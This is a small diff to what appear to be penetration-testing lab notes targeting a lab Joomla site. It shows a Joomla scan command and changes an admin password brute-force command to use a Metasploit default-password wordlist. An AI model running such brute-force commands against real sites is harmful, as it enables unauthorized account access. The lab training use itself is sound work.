@@ -6,4 +6,4 @@
 python2.7 joomlascan.py -u http://dev.inlanefreight.local
 
 ## Joomla Brute Password Brute Force (Admin) ##
-python3 joomla-brute.py -u http://dev.inlanefreight.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_users.txt -usr admin
+python3 joomla-brute.py -u http://dev.inlanefreight.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
